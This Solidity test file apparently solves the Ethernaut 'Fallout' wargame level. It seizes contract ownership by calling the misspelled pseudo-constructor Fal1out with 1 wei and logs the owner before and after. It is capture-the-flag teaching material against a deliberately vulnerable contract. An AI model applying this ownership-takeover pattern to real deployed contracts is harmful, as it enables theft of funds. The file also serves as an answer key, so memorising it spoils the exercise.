pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Fallout/FalloutFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract FalloutTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testFalloutHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Call Fal1out constructor function with some value, mispelling enables us to call it - log owner before and after  
        emit log_named_address("Fallout Owner Before Attack", ethernautFallout.owner());
        ethernautFallout.Fal1out{value: 1 wei}();
        emit log_named_address("Fallout Owner After Attack", ethernautFallout.owner());

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}